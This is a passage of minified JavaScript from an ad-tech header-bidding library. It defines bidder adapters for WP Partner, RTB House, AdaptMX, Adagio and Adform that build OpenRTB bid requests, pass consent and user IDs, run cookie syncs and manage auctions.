            if (s.ext && s.ext.siteid && -1 !== s.ext.siteid.indexOf("bidid")) return o.track.doError("[" + o.chd.tag + "] site id includes bidid"), void (r && r(null, null));
            s.ext && !s.ext.slotid ? o.track.doError("[" + o.chd.tag + "] missing slotid in response") : o.slotid = s.ext.slotid, s.ext && s.ext.tagid && s.ext.tagid !== o.slot && o.track.doError("[" + o.chd.tag + "] tagid differs");
            var a = AdTrack.Utils.isBlackListedAds(s.adomain),
              d = AdTrack.Utils.testAd(s.adomain, o.definition.options.contentBlackList || []);
            !1 === a && !1 === d && (e.cur && e.cur !== o.chd.currency ? o.track.doError("Channel " + o.chd.tag + " responsed with wrong currency: " + e.cur) : (n = AdTrack.Price.create(s.price, AdTrack.Price.EUR, null), t.setPrice(n), t.setWidth(s.w ? s.w : o.chd.width), t.setHeight(s.h ? s.h : o.chd.height), t.setCreativeId(s.crid)));
          } else a && o.track.doError("Blocked WPartner creative from " + a, "info"), o.chd.logs && o.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(o.track.server, o.chd.logs.blocked_creative, o.chd.tag, "", "", s.price, s.adm), r && r(null, null);
          o.response = e, r && r(n, e);
        }).fail(function (t, e) {
          e ? o.track.evBidTimeout(o.definition, o.chd) : o.track.evBidError(o.definition, o.chd), r && r(null, null);
        }).send();
      } else r(null, null);
    },
    createData: function (t, e) {
      this.auctionId = AdTrack.Utils.uuid();
      for (var i = 1e15 + Math.round(1e15 * Math.random()), r = {
          id: this.auctionId,
          site: this.siteObject,
          imp: [],
          cur: ["EUR"],
          tmax: this.chd.timeout || 450,
          user: {},
          regs: {},
          device: {
            language: navigator.language || navigator.languages && navigator.languages[0],
            w: screen.width,
            h: screen.height
          },
          test: this.chd.test ? 1 : void 0
        }, n = [{
          w: this.chd.width,
          h: this.chd.height
        }], s = this.chd.sizes ? this.chd.sizes : [], a = 0; a < s.length; a++) 2 === s[a].length && n.push({
        w: s[a][0],
        h: s[a][1]
      });
      var o = {
        id: "bidid-" + i,
        bidfloor: 0,
        bidfloorcur: "EUR",
        tagid: t,
        ext: {
          data: {
            pbsize: this.chd.width + "x" + this.chd.height + "_1"
          }
        }
      };
      if (e === this.BANNER) o.banner = {
        format: n,
        id: "" + i
      };else if (e === this.NATIVE) {
        var d = {
          native: {
            assets: [{
              required: !0,
              id: 3,
              img: {
                wmin: 600,
                hmin: 314,
                type: 3
              }
            }, {
              required: !1,
              id: 2,
              img: {
                wmin: 16,
                hmin: 16,
                type: 1
              }
            }, {
              required: !0,
              id: 0,
              title: {
                len: 300
              }
            }, {
              required: !0,
              id: 4,
              data: {
                type: 2
              }
            }, {
              required: !1,
              id: 5,
              data: {
                type: 1
              }
            }, {
              required: !1,
              id: 1,
              data: {
                type: 12
              }
            }]
          }
        };
        o.native = {
          request: JSON.stringify(d)
        }, o.ext.data.pbsize = "1x1_1";
      }
      if (r.imp = [o], this.applyHints(r), AdTrack.CMP) {
        var c = AdTrack.CMP.getConsentData();
        c && (this.track.evBidConsent(this.definition, this.chd, !0), r.regs.gdpr = c.gdprApplies ? 1 : 0, r.user.consent = c.consentString);
      }
      if (AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var h = AdTrack.UserID.getAllUserIdsAsEids();
        h && h.length > 0 && (r.user.eids = h);
      }
      return r;
    },
    getSiteObj: function (t) {
      var e,
        i = AdTrack.Utils.windowTopAccess();
      return i && (e = i.document.body.parentNode.lang), {
        id: t || void 0,
        publisher: this.accountId ? {
          id: "" + this.accountId
        } : void 0,
        page: AdTrack.url,
        domain: AdTrack.Utils.getDomain(this.definition.info),
        ref: AdTrack.Utils.getDomainNameFromUrl(document.referrer, !0) || null,
        content: {
          language: e
        }
      };
    },
    applyHints: function (t) {
      const {
        location: e
      } = document;
      this.pageview.id && e.pathname === this.pageview.path || (this.pageview.path = e.pathname, this.pageview.id = "" + Math.floor(1e20 * Math.random()));
      const {
          connection: i = {},
          deviceMemory: r,
          userAgentData: n = {}
        } = navigator,
        s = window.visualViewport || !1,
        a = [],
        o = {
          "CH-Ect": i.effectiveType,
          "CH-Rtt": i.rtt,
          "CH-SaveData": i.saveData,
          "CH-Downlink": i.downlink,
          "CH-DeviceMemory": r,
          "CH-Dpr": window.devicePixelRatio,
          "CH-ViewportWidth": s.width,
          "CH-BrowserBrands": JSON.stringify(n.brands),
          "CH-isMobile": n.mobile
        };
      for (var d in o) o.hasOwnProperty(d) && o[d] && a.push({
        name: d,
        value: "" + o[d]
      });
      t.user.data = [{
        id: "12",
        name: "NetInfo",
        segment: a
      }, {
        id: "7",
        name: "pvid",
        segment: [{
          value: this.pageview.id
        }]
      }];
    },
    sendNotification: function (t) {
      AdTrack.Ajax.request({
        url: "https://ssp.wp.pl/bidder/notify",
        method: "POST",
        data: JSON.stringify(t),
        async: !0
      }).send();
    },
    handleBidWonNotification: function (t, e) {
      this.updateSiteObjectForBid(t);
      var i = this.getNotificationPayload(t, e);
      i ? (i.event = "bidWon", this.sendNotification(i)) : this.track.doError("[" + this.chd.tag + "] No notification sent");
    },
    handleImpressEvent: function (t) {
      t.ext && t.ext.vurls && Array.isArray(t.ext.vurls) && t.ext.vurls.length > 0 && this.track.renderer.on("impress", function () {
        t.ext.vurls.forEach(function (t) {
          AdTrack.Utils.firePixel(t);
        });
      });
    },
    updateSiteObjectForBid: function (t) {
      this.siteObject.slot = this.slot, this.siteObject.sn = this.pageview.sn;
      var e = t.ext;
      e && (this.siteObject.id = e.siteid || this.siteObject.id, this.siteObject.slot = e.slotid, this.siteObject.publisherId = e.pubid, this.siteObject.adLabel = e.adlabel);
    },
    getNotificationPayload: function (t, e) {
      if (t) {
        var i = Array.isArray(t) ? t : [t];
        if (i.length > 0) {
          var r = {
            requestId: void 0,
            siteId: [],
            tagid: [],
            slotId: []
          };
          return i.forEach(t => {
            this.siteObject.id && r.siteId.push(this.siteObject.id), this.slotid && r.slotId.push(this.slotid), r.tagid.push(this.slot), r.requestId = this.response.id || r.requestId, r.timeout = t.timeout || r.timeout || this.bidTimeout, r.pvid = this.pageview.id, t.cpm && (r.cpm = t.cpm, r.cpmpl = t.ext && t.ext.pricepl, r.creativeId = t.crid || "mcad_" + this.auctionId + "_" + this.slot, r.adomain = t.adomain && t.adomain[0], r.networkName = e);
          }), r;
        }
      }
    }
  }, AdTrack.WPartnerCSync = AdTrack.WPartnerCSync || (i = !1, function (t) {
    if (!i) {
      var e = "https://ssp.wp.pl/bidder/usersync",
        r = AdTrack.CMP.getConsentData();
      e += "?pvid=" + t.id + "&sn=" + (t.sn || "mc_adapter"), r && (e += "&tcf=" + (r.tcfPolicyVersion ? r.tcfPolicyVersion : "")), AdTrack.Utils.csyncFrame(e), i = !0;
    }
  });
}, function (t, e) {
  AdTrack.RTBHouseHelper = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null;
  }, AdTrack.RTBHouseHelper.prototype = {
    NATIVE: "native",
    BANNER: "banner",
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e, i, r) {
      var n = this.createData(e, i),
        s = this.__onSuccess.bind(this, t, i),
        a = this.__onError.bind(this);
      AdTrack.Ajax.request({
        label: "RTB House Online bid",
        url: "https://prebid-eu.creativecdn.com/bidder/prebid/bids",
        method: "POST",
        async: !this.definition.options.noAsync,
        json: !0,
        timeout: this.chd.timeout || 800,
        data: JSON.stringify(n),
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (t) {
        s(t, r);
      }).fail(function (t, e) {
        a(t, e, r);
      }).send();
    },
    createData: function (t, e) {
      var i = AdTrack.Utils.uuid(),
        r = AdTrack.Utils.getDomain(this.definition.info),
        n = {
          cur: [AdTrack.Price.USD],
          device: {
            dnt: AdTrack.Utils.getDNT(),
            h: window.innerHeight,
            w: window.innerWidth,
            language: AdTrack.Utils.getLanguage(!0),
            ua: navigator.userAgent
          },
          id: i,
          imp: [],
          site: {
            domain: r,
            name: AdTrack.Utils.getOrigin(),
            page: AdTrack.url,
            publisher: {
              id: AdTrack.Config.getAccountId("rtb-house")
            },
            ref: AdTrack.Utils.getReferrer()
          },
          source: {
            tid: i
          },
          test: this.chd.test
        },
        s = null;
      if (AdTrack.CMP && (s = AdTrack.CMP.getConsentData()), s && s.gdprApplies) {
        var a = s.consentString ? s.consentString.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "") : "",
          o = s.gdprApplies ? 1 : 0;
        this.track.evBidConsent(this.definition, this.chd, !0), n.regs = {
          ext: {
            gdpr: o
          }
        }, n.user = {
          ext: {
            consent: a
          }
        };
      }
      var d = this.track.getSupplyChain();
      d && (n.ext = {
        schain: d
      });
      var c,
        h = {
          ext: {
            tid: AdTrack.Utils.uuid()
          },
          id: AdTrack.Utils.randomString(),
          tagid: t
        };
      if (e === this.BANNER) this.chd.sizes ? (c = this.chd.sizes).unshift([this.chd.width, this.chd.height]) : c = [[this.chd.width, this.chd.height]], h.banner = {
        format: c.map(function (t) {
          return {
            w: t[0],
            h: t[1]
          };
        }),
        w: this.chd.width,
        h: this.chd.height
      };else if (e === this.NATIVE) {
        var l = {
          assets: [{
            required: 1,
            id: 1,
            title: {
              len: 300
            }
          }, {
            required: 1,
            id: 2,
            img: {
              wmin: 600,
              hmin: 314,
              type: 3
            }
          }, {
            required: 0,
            id: 3,
            img: {
              wmin: 16,
              hmin: 16,
              type: 1
            }
          }, {
            required: 0,
            id: 5,
            data: {
              type: 1
            }
          }, {
            required: 1,
            id: 4,
            data: {
              type: 2
            }
          }, {
            required: 0,
            id: 6,
            data: {
              type: 12
            }
          }]
        };
        h.native = {
          request: l,
          ver: "1.1"
        };
      }
      if (h.bidfloor = this.chd.bidFloor || .03, n.imp.push(h), AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var u = AdTrack.UserID.getAllUserIdsAsEids();
        u && u.length > 0 && (n.user && n.user.ext ? n.user.ext.eids = u : n.user = {
          ext: {
            eids: u
          }
        });
      }
      return n;
    },
    __onSuccess: function (t, e, i, r) {
      if (this.response = i, Array.isArray(i) && i[0]) {
        var n = i[0];
        if (!n.adm) return this.track.doError("Channel " + this.chd.tag + " responded with unknown response."), void (r && r(null, null));
        var s = 0 === n.adm.indexOf("{");
        if (e === this.NATIVE && !s || e === this.BANNER && s) return this.track.doError("Channel " + this.chd.tag + " responded with wrong media type."), void (r && r(null, null));
        var a = AdTrack.Utils.isBlackListedAds(n.adm),
          o = AdTrack.Utils.testAd(n.adm, this.definition.options.contentBlackList || []);
        if (!1 !== a || !1 !== o) return a && this.track.doError("Blocked RTB House creative (" + n.adid + ") from " + a, "info"), this.chd.logs && this.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(this.track.server, this.chd.logs.blocked_creative, this.chd.tag, n.adid || "", "", n.price, n.adm), void (r && r(null, null));
        if (!n.price && !this.chd.test) return this.track.doError("Channel " + this.chd.tag + " responded with empty price."), void (r && r(null, null));
        var d = AdTrack.Price.create(n.price, AdTrack.Price.USD);
        t.setPrice(d), t.setCreativeId(n.adid), t.setWidth(n.w && n.h ? n.w : this.chd.width), t.setHeight(n.w && n.h ? n.h : this.chd.height), r && r(d, this.response);
      } else r && r(null, null);
    },
    __onError: function (t, e, i) {
      e ? this.track.evBidTimeout(this.definition, this.chd) : this.track.evBidError(this.definition, this.chd), this.price = null, i && i(null, null);
    }
  };
}, function (t, e) {
  var i;
  AdTrack.AdaptMxHelper = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.prebidVideo = this.definition.options.hb && (this.definition.options.hb.prebidVideo || this.definition.options.customPrebidVideo), this.chd.sizes ? (this.sizes = this.chd.sizes, this.sizes.unshift([this.chd.width, this.chd.height])) : this.sizes = [[this.chd.width, this.chd.height]];
  }, AdTrack.AdaptMxHelper.prototype = {
    BANNER: "banner",
    VIDEO: "video",
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e, i, r) {
      var n = AdTrack.Utils.simpleStringGenerator(14),
        s = AdTrack.Utils.uuid(),
        a = this.chd.timeout || 800,
        o = this.createData(e, s, n),
        d = this.__onSuccess.bind(this, t),
        c = this.__onError.bind(this);
      AdTrack.Ajax.request({
        label: "AdaptMX bid",
        url: "https://prebid.a-mo.net/a/c",
        method: "POST",
        data: JSON.stringify(o),
        json: !0,
        async: !this.definition.options.noAsync,
        headers: {},
        timeout: a,
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0), this.trackEvent("pbto", {
            A: "amx",
            bid: n,
            a: e,
            cn: a,
            aud: s
          });
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this),
        withCredentials: !0
      }, this.track.errorReporting).done(function (t) {
        d(t, r);
      }).fail(function (t, e) {
        c(t, e);
      }).send();
    },
    createData: function (t, e, i, r) {
      var n = !!this.chd.test,
        s = AdTrack.Utils.getDomain(this.definition.info),
        a = {
          dnt: AdTrack.Utils.getDNT() ? 1 : 0,
          language: AdTrack.Utils.getLanguage(!0),
          ua: navigator.userAgent,
          w: window.innerWidth,
          h: window.innerHeight
        },
        o = {
          domain: s,
          page: AdTrack.url,
          ref: AdTrack.Utils.getReferrer()
        },
        d = {
          a: e,
          B: 0,
          b: AdTrack.Utils.getDomainNameFromUrl(AdTrack.url, !0),
          brc: 0,
          bwc: 0,
          trc: 0,
          tm: n,
          V: "8.20.0",
          vg: "r2b2_pbjs",
          i: this.getID(r, n),
          l: {},
          f: .01,
          cv: "pba1.3.3",
          st: "prebid",
          h: screen.height,
          w: screen.width,
          gs: "",
          gc: "",
          u: AdTrack.url,
          do: AdTrack.Utils.getDomainNameFromUrl(AdTrack.url, !0),
          re: AdTrack.Utils.getReferrer(),
          am: AdTrack.Utils.getLocalStorageItem("__amuidpb"),
          usp: "1---",
          smt: 1,
          d: "",
          m: this.createBidMap(i, t, r, n),
          cpp: 0,
          gpp: {
            gppString: "",
            applicableSections: ""
          },
          fpd2: {
            device: a,
            site: o,
            source: {}
          },
          sync: {
            d: 0,
            l: 0,
            t: 0,
            e: !0
          },
          tmax: this.chd.timeout,
          eids: []
        };
      AdTrack.UserID && !this.track.getOption("disableUserId") && (d.eids = AdTrack.UserID.getAllUserIdsAsEids());
      var c = !1,
        h = !1;
      if (AdTrack.CMP) {
        var l = AdTrack.CMP.getConsentData();
        l && (c = !0, d.gs = l.gdprApplies, d.gc = l.consentString);
      }
      if (AdTrack.USP) {
        var u = AdTrack.USP.getConsentData();
        u && u.consentString && (h = !0, d.usp = u.consentString);
      }
      return (c || h) && this.track.evBidConsent(this.definition, this.chd, c, h), AdTrack.UserSync.isVendorAllowed(737) && (d.sync.d = 5e3, d.sync.l = 5, d.sync.t = 3), d;
    },
    createBidMap: function (t, e, i, r) {
      var n = {},
        s = this.chd.height > 100,
        a = [this.sizes, this.sizes, []],
        o = this.track.getSupplyChain();
      if (n[t] = {
        au: e,
        av: s,
        ms: a,
        aw: this.chd.width,
        ah: this.chd.height,
        tf: 0,
        sc: o || {},
        f: this.chd.bidFloor || 0
      }, i === this.BANNER) n[t].vr = !1, n[t].vd = {};else if (i === this.VIDEO) {
        var d = {
          context: "outstream",
          playerSize: this.sizes,
          mimes: ["video/mp4", "video/webm", "video/3gpp"],
          protocols: [2, 3, 5, 6],
          playbackmethod: [5],
          placement: 3,
          maxduration: 90,
          linearity: 1,
          api: [1, 2],
          skip: 1,
          w: this.chd.width,
          h: this.chd.height
        };
        n[t].vr = !0, n[t].vd = d;
      }
      var c = this.getID(i, r);
      return "string" == typeof c && c.length > 0 && (n[t].i = c), r && (n[t].mt = !0), n;
    },
    getID: function (t, e) {
      return e ? "cHJlYmlkLm9yZw" : t === this.BANNER ? "cmIyYi5pbw" : "cjJiMi5pby12aWRlbw";
    },
    trackEvent: function (t, e) {
      var i = "https://1x1.a-mo.net/hbx/g_" + t + "?" + AdTrack.Utils.json2Url(e);
      AdTrack.Utils.firePixel(i);
    },
    __onError: function (t, e, i) {
      e ? this.track.evBidTimeout(this.definition, this.chd) : this.track.evBidError(this.definition, this.chd), i && i(null, null);
    },
    __onSuccess: function (t, e, i) {
      try {
        e && e.am && "string" == typeof e.am && AdTrack.Utils.setLocalStorageItem("__amuidpb", e.am);
      } catch (t) {
        this.track.doError("[" + this.chd.tag + "] Error during storing UID: " + t.message);
      }
      if (this.track.shouldCsync("adaptmx") && AdTrack.UserSync.addUserSync("adaptmx", 737, function () {
        AdTrack.AdaptMxHbCSync(e);
      }, this.track.settings), e && e.r) {
        var r = Object.keys(e.r);
        if (r[0] && e.r[r[0]]) {
          var n = e.r[r[0]];
          if (n[0] && n[0].b && n[0].b[0]) {
            var s = n[0].b[0];
            if (this.adData = s.adm, e.currency && e.currency !== AdTrack.Price.USD) return this.track.doError("Channel " + this.chd.tag + " responsed with wrong currency: " + e.currency), void (i && i(null, null));
            var a = AdTrack.Price.create(s.price, AdTrack.Price.USD, null);
            t.setPrice(a), t.setCreativeId(s.crid), t.setWidth(this.chd.width), t.setHeight(this.chd.height), null != s.w && s.w > 1 && null != s.h && s.h > 1 && (t.setWidth(s.w), t.setHeight(s.h)), this.prebidVideo && (t.setVideoVastXML(s.adm), t.setVideoImpUrl(AdTrack.Utils.getVideoImpUrl(this.track.unitID, key, this.chd, this.track.server))), i && i(a, e);
          } else i && i(null, null);
        } else i && i(null, null);
      } else i && i(null, null);
    }
  }, AdTrack.AdaptMxHbCSync = AdTrack.AdaptMxHbCSync || (i = !1, function (t) {
    if (!i) {
      let n = "https://prebid.a-mo.net/isyn?&gpp=&gpp_sid=";
      if (AdTrack.CMP) {
        var e = AdTrack.CMP.getConsentData();
        e && (n += "&gdpr=" + (e.gdprApplies ? 1 : 0), n += "&gdpr_consent=" + e.consentString);
      }
      if (AdTrack.USP) {
        var r = AdTrack.USP.getConsentData();
        r && r.consentString && (n += "&us_privacy=" + encodeURIComponent(r.consentString));
      }
      let s = 0,
        a = !1;
      t && t.p && t.p.hreq ? (t.p.hreq.forEach(function (t) {
        s++;
        var e = -1 !== t.indexOf("__st=iframe") ? "iframe" : "image";
        a = a || "iframe" === e || -1 !== t.indexOf("cchain"), "iframe" === e ? AdTrack.Utils.csyncFrame(t) : AdTrack.Utils.firePixel(t);
      }), !a && s < 2 && AdTrack.Utils.csyncFrame(n)) : AdTrack.Utils.csyncFrame(n), i = !0;
    }
  });
}, function (t, e) {
  var i;
  AdTrack.AdagioCSync = AdTrack.AdagioCSync || (i = !1, function (t) {
    if (!i) {
      try {
        t && t.data && t.data.user_syncs && t.data.user_syncs.length && t.data.user_syncs.forEach(function (t) {
          "image" === t.type ? AdTrack.Utils.firePixel(t.url) : "iframe" === t.type ? AdTrack.Utils.csyncFrame(t.url) : "string" == typeof t.html && AdTrack.Utils.useTrackerFromHtml(t.html);
        }), t && t.userSyncs && t.userSyncs.length && t.userSyncs.forEach(function (t) {
          "p" === t.t ? AdTrack.Utils.firePixel(t.u) : AdTrack.Utils.csyncFrame(t.u);
        });
      } catch (t) {
        context.track.doError("[" + context.chd.tag + "] Error with CSync: " + t.message);
      }
      i = !0;
    }
  });
}, function (t, e) {
  AdTrack.AdformNAHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.delayTime = 800, this.adformUtils = new AdTrack._AdFormUtils(), this.helper = new AdTrack.AdformHelper(t, e, i), this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
  }, AdTrack.AdformNAHBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, this.helper.OUTDOOR, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      if (this.data) {
        var r = this.processData(t, this.data, e ? e.normal : null);
        i(r);
      } else {
        var n = this.track.getChannelKey(this.chd, e ? e.normal : null);
        if (n) {
          var s = function (r) {
            var n = r[0];
            if (n && n.outdoor && n.outdoor.imp) {
              var s = n.outdoor.imp.split("?bn=")[1].split(";")[0],
                a = "//track.adform.net/adfserve/?bn=" + s + "&CREFURL=" + encodeURIComponent(AdTrack.url);
              this.ajaxGet(a, {
                Accept: "text/plain"
              }, function (n) {
                var a = n.target.responseText,
                  o = {
                    bn: s,
                    data: r[0].outdoor,
                    data2: a
                  },
                  d = this.processResult(o, t, e ? e.normal : null);
                d ? i(d) : this.track.passback(this.definition, this.chd);
              }.bind(this));
            } else this.track.passback(this.definition, this.chd);
          }.bind(this);
          this.price && this.response ? s(this.response) : this.bid(function (t, e) {
            s(e);
          }, n);
        } else this.track.doError("Undefined key");
      }
    },
    processData: function (t, e, i) {
      var r = new AdTrack.AdSet();
      r.setStyle(i);
      var n = new AdTrack.AdChoices();
      n.setPromoClickUrl(this.chd.url), n.setPromoText(this.chd.title), n.setOptional(!0), r.addAdChoices(n);
      var s,
        a = new AdTrack.TextAd();
      for (s = 0; s < e.texts.length; s++) a.addText(e.texts[s].title, e.texts[s].desc);
      for (s = 0; s < e.images.length; s++) {
        var o = e.images[s],
          d = new Image();
        d.src = o, a.addScreenshot(o, d.width, d.height, o);
      }
      var c = !0 === this.definition.test ? "#" : e.url;
      a.setClickUrl(c), a.setVisibleUrl(""), a.setFavicon(""), a.done(), r.addAd(new AdTrack.AdformAd(r, a));
      var h = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting),
        l = AdTrack.MediaTypes.createNativeSettings(this.chd, r, h);
      return new AdTrack.MediaTypes.Native(l, this.track.errorReporting);
    },
    templateR2B2: function (t, e) {
      var i,
        r,
        n,
        s = e || [];
      if (t.nadpis && t.popisek1 && t.popisek2) return i = t.nadpis, r = t.popisek ? t.popisek : t.popisek1 + " " + t.popisek2, s.push({
        title: i,
        description: r
      }), s;
      for (n in e = {}, t) if (t.hasOwnProperty(n) && n.match(/(nadpis|popisek)_[0-9]*$/)) {
        var a = n.split("_")[1],
          o = n.split("_")[0];
        e[a] = e[a] ? e[a] : {}, e[a][o] = t[n];
      }
      for (n in e) e.hasOwnProperty(n) && (i = e[n].nadpis ? e[n].nadpis : t.nadpis ? t.nadpis : null, r = e[n].popisek ? e[n].popisek : t.popisek ? t.popisek : null, i && r && s.push({
        title: i,
        description: r
      }));
      return s;
    },
    templateIM: function (t, e) {
      var i,
        r,
        n = e || [],
        s = [],
        a = [];
      for (var o in t) t.hasOwnProperty(o) && o.match(/title_(short|medium|long)$/) && "" != t[o] && s.push(t[o]), t.hasOwnProperty(o) && o.match(/description_(short|medium|long)$/) && "" != t[o] && a.push(t[o]);
      for (var d = 0; d < s.length; d++) {
        i = s[d];
        for (var c = 0; c < a.length; c++) r = a[c], n.push({
          title: i,
          description: r
        });
      }
      return n;
    },
    processResult: function (t, e, i) {
      var r = JSON.parse("[" + t.data2.split("Adform.BannerData.videoSources = [")[1].split("];")[0] + "]"),
        n = t.data2.split("var ADFDomain='")[1].split("';")[0],
        s = (t.data2.split("var ADF_clickTag='")[1].split("';")[0], JSON.parse(t.data2.split("Adform.RMBData.userParams            = ")[1].split("};")[0] + "}"));
      this.count = 1, this.adData = {
        data: t.data,
        data2: s,
        baseUrl: n,
        images: r
      };
      var a = new AdTrack.AdSet();
      a.setStyle(i);
      var o = new AdTrack.AdChoices();
      o.setPromoClickUrl(this.chd.url), o.setPromoText(this.chd.title), o.setOptional(!0), a.addAdChoices(o);
      var d = new AdTrack.TextAd(),
        c = [];
      this.templateR2B2(s, c), this.templateIM(s, c);
      for (var h = 0; h < c.length; h++) {
        var l = c[h];
        d.addText(l.title, l.description);
      }
      if (!d.texts || d.texts.length < 1) return this.track.doError("Adform template didnt provide any text.", {
        bn: t.bn,
        pageUrl: s.viditelnaURL,
        landingPage: s.landingPage
      }), !1;
      for (var u = 0; u < r.length; u++) {
        var p = n + r[u].file,
          f = new Image();
        f.src = p, d.addScreenshot(p, f.width, f.height, p);
      }
      var g = s.viditelnaURL ? s.viditelnaURL : "",
        m = s.landingPage ? s.landingPage : "",
        k = !0 === this.definition.test ? m : t.data.clk;
      d.setClickUrl(k), d.setVisibleUrl(g), d.setAdUrl(m), d.setCta(s.ctaPopisek), d.setFavicon(""), d.done(), a.addAd(new AdTrack.AdformAd(a, d));
      var b = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting),
        v = {
          chd: this.chd,
          ad: {
            type: "tcproxy",
            data: {
              adSet: a,
              tc: b
            }
          },
          style: i,
          count: 1,
          impTrackers: [t.data.imp]
        };
      return new AdTrack.MediaTypes.Native(v, this.track.errorReporting);
    },
    ajaxGet: function (t, e, i) {
      e || (e = {});
      var r = new XMLHttpRequest();
      for (var n in r.open("GET", t, !0), e) e.hasOwnProperty(n) && r.setRequestHeader(n, e[n]);
      return r.addEventListener("load", "function" == typeof i ? i : function () {}), r.onerror = function () {
        this.track.passback(this.definition, this.chd);
      }.bind(this), r.ontimeout = function () {
        this.track.passback(this.definition, this.chd);
      }.bind(this), r.timeout = this.delayTime, r.send(), r;
    },
    checkResult: function (t) {
      for (var e = !0, i = ["popisek1", "popisek2", "nadpis", "popisek_1", "popisek_2", "popisek_3", "popisek_4", "popisek_5", "nadpis_1", "nadpis_2", "nadpis_3", "nadpis_4", "nadpis_5", "viditelnaURL"], r = 0; r < Object.keys(t).length; r++) {
        var n = Object.keys(t)[r],
          s = t[n];
        if ("ctaPopisek" == n || "landingPage" == n) {
          if ("" == s) {
            e = !1;
            break;
          }
        } else {
          if (-1 == i.indexOf(n)) {
            e = !1;
            break;
          }
          if (s.match(/^[0-9]{2,3} znaků/g)) {
            e = !1;
            break;
          }
        }
      }
      return e;
    }
  };
}, function (t, e, i) {
  "use strict";

  i.r(e);
  var r = i(0);
  function n(t, e, i, r) {
    let n = new Error(e);
    return n.adtrack = {
      message: e,
      severity: i,
      params: r,
      type: t
    }, n;
  }
  function s(t, e, i) {
    return n(r.a.ERROR.TYPE.UNEXPECTED_STATE, t, e, i);
  }
  function a(t, e) {
    let i = {};
    setTimeout(function () {
      Object.keys(i).forEach(function (t) {
        i[t].timeout();
      });
    }, e);
    let s = {
      getId: function () {
        return t;
      },
      getTimeout: function () {
        return e;
      }
    };
    return s.addUnit = function (t) {
      const e = t.getName();
      if (i[e]) throw s = "Duplicate unit in auction", a = r.a.ERROR.SEVERITY.LOW, o = {
        unit: e
      }, n(r.a.ERROR.TYPE.PUBLISHER_SETTINGS, s, a, o);
      var s, a, o;
      i[e] = t;
    }, s.getUnits = function () {
      return i;
    }, s;
  }
  const o = function () {
    let t = {},
      e = {
        getAuction: function (e, i) {
          return t[e] || (t[e] = a(e, i)), t[e];
        },
        getAll: function () {
          return t;
        },
        clear: function () {
          t = {};
        }
      };
    return e;
  }();
  const d = function () {
    let t = {},
      e = {
        addRequest: function (e) {
          t[e.getId()] = e;
        },
        getRequest: function (e) {
          return t[e];
        },
        getAll: function () {
          return t;
        },
        clear: function () {
          t = {};
        }
      };
    return e;
  }();
  function c(t, e, i) {
    let n = AdTrack.Utils.randomString("r"),
      a = !0,
      o = null,
      d = {
        getId: function () {
          return n;
        },
        getUnitName: function () {
          return t;
        },
        getCurrency: function () {
          return e;
        },
        isPending: function () {
          return a;
        },
        getAssignedBid: function () {
          return o;
        },
        assignBid: function (t) {
          if (o) throw s("Cant assign bid, there is a bid assigned already", r.a.ERROR.SEVERITY.LOW);
          o = t;
        }
      };
    return d.finish = function () {
      if (!a) throw s("The request is already finished", r.a.ERROR.SEVERITY.LOW);
      a = !1;
      let d = o ? function (e, i) {
        let r = {},
          s = AdTrack.units[t],
          a = e.getChannel().bidResponse;
        return a && (r.sendDimension = s.definition.options.hb.sendPrebidDimension || s.definition.options.customSendPrebidDimension, r.video = s.definition.options.hb.prebidVideo || s.definition.options.customPrebidVideo), {
          adID: t,
          price: e.price.getPrice(i),
          currency: i,
          creativeId: n,
          dealId: e.price.getDealId() || null,
          response: a,
          options: r,
          isBranding: "branding" === s.definition.renderer
        };
      }(o, e) : null;
      i(d);
    }, d;
  }
  const h = function (t, e, i) {
    const r = c(t, e, i);
    return d.addRequest(r), r;
  };
  const l = function () {
    let t = {},
      e = {};
    return e.getUnit = function (e) {
      const i = e.getName();
      return t[i] || (t[i] = function (t) {
        let e = !1,
          i = null,
          n = null,
          a = [],
          o = function () {
            return i && i.hasValidBids();
          },
          d = function () {
            if (n && n.isPending()) {
              if (!n.getAssignedBid() && o()) {
                const t = i.getNext(!0);
                n.assignBid(t);
              }
              n.finish();
            }
          },
          c = {
            getName: function () {
              return t;
            },
            getNTHB: function () {
              return i;
            },
            getCurrentRequest: function () {
              return n;
            },
            setNTHB: function (t) {
              i = t;
            },
            finish: function () {
              e = !0, d();
            },
            isPlacementFinished: function () {
              return e;
            },
            timeout: function () {
              d();
            },
            getNumberOfRequests: function () {
              return a.length;
            },
            request: function (i, c) {
              if ("function" != typeof c) return;
              if (n && n.isPending()) throw s("Multiple requests for unit", r.a.ERROR.SEVERITY.LOW, {
                unit: t
              });
              let l = n && n.getAssignedBid(),
                u = h(t, i, c);
              if (a.push(u), n = u, l && !l.displayed) return n.assignBid(l), void n.finish();
              if (e) if (a.length > 1 && !o()) {
                const i = AdTrack.units[t];
                e = !1, i.start(i.definition);
              } else d();
            }
          };
        return c;
      }(i)), t[i];
    }, e.getAll = function () {
      return t;
    }, e.clear = function () {
      t = {};
    }, e;
  }();
  var u = i(1);
  AdTrack.hb2 = AdTrack.hb2 || function () {
    let t = "USD";
    return {
      connectNthb: function (t, e) {
        l.getUnit(t).setNTHB(e);
      },
      finishUnit: function (t) {
        l.getUnit(t).finish();
      },
      getHighestBidForAdUnit: function (e, i, n, s) {
